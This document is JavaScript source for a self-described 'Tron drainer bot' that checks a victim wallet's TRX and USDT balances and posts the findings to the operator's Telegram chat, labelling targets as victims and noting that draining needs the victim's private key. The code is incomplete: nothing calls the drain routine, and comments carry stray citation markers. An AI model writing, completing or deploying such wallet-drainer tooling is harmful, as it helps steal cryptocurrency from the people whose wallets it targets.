// ============================================================
// 🔴 TRON DRAINER BOT
// Dependencies: npm install tronweb
// ============================================================
const TronWeb = require('tronweb');
const http = require('http');

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Tron Drainer Running\n');
});
server.listen(process.env.PORT || 8083);

// Configuration [citation:8]
const YOUR_TRX_ADDRESS = process.env.TRX_WALLET_ADDRESS;
const YOUR_PRIVATE_KEY = process.env.TRX_PRIVATE_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Initialize TronWeb
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: YOUR_PRIVATE_KEY
});

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

async function sendTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
    });
  } catch (err) {}
}

class TronDrainer {
  async getAccountInfo(address) {
    try {
      const account = await tronWeb.trx.getAccount(address);
      const balance = account.balance || 0;
      
      // Get TRC20 balances [citation:3][citation:8]
      const contract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtBalance = await contract.balanceOf(address).call();
      
      return {
        trx: balance / 1e6,
        usdt: usdtBalance / 1e6
      };
    } catch (err) {
      console.error('Error getting Tron account:', err);
      return null;
    }
  }

  async drainAddress(victimAddress) {
    try {
      const info = await this.getAccountInfo(victimAddress);
      if (!info || (info.trx < 1 && info.usdt < 1)) {
        await sendTelegram(`ℹ️ No significant assets at ${victimAddress.slice(0,8)}...`);
        return;
      }

      await sendTelegram(
        `🎯 <b>Tron Assets Found</b>\n\n` +
        `Address: ${victimAddress.slice(0,8)}...\n` +
        `TRX: ${info.trx}\n` +
        `USDT: ${info.usdt}\n\n` +
        `⚠️ Manual drain required (needs victim's private key)`
      );

    } catch (err) {
      console.error('Tron drain error:', err);
    }
  }
}

const drainer = new TronDrainer();
console.log('Tron drainer started');
